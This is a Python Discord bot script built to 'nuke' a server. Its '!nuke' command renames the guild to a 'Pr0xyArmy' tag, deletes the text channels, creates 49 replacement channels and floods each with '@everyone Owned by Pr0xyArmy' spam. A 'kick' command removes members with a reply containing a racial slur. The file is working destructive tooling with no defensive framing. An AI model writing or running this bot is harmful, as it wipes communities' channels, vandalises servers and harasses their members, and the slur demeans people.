import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')


@bot.command(name='nuke')
async def create_channels(ctx):
    new_server_name = '☠ Pr0xyArmy ☠'
    await ctx.guild.edit(name=new_server_name)

    await ctx.send(f'@everyone Owned by Pr0xyArmy ')
    
    delete_tasks = [channel.delete() for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel) and channel.type == discord.ChannelType.text and not channel.is_news() and not channel.is_nsfw()]

    await asyncio.gather(*delete_tasks)

    async def create_channel(i):
        channel_name = f'☠ Ownedbypr0xyarmy ☠'
        channel = await ctx.guild.create_text_channel(channel_name)
        if channel:
            for _ in range(12): 
                await channel.send('@everyone Owned by ☠ Pr0xyArmy ☠   https://cdn.discordapp.com/icons/1053102207060426802/a_0111736fd74b168ef17ba406c2ae3107.gif')

    create_tasks = [create_channel(i) for i in range(1, 50)]
    await asyncio.gather(*create_tasks)

@bot.command(name='kick')
async def kick(ctx, member: discord.Member, *, reason=None):
    await member.kick(reason=reason)
    await ctx.send(f'negr byl odpojen')


bot.run('token')
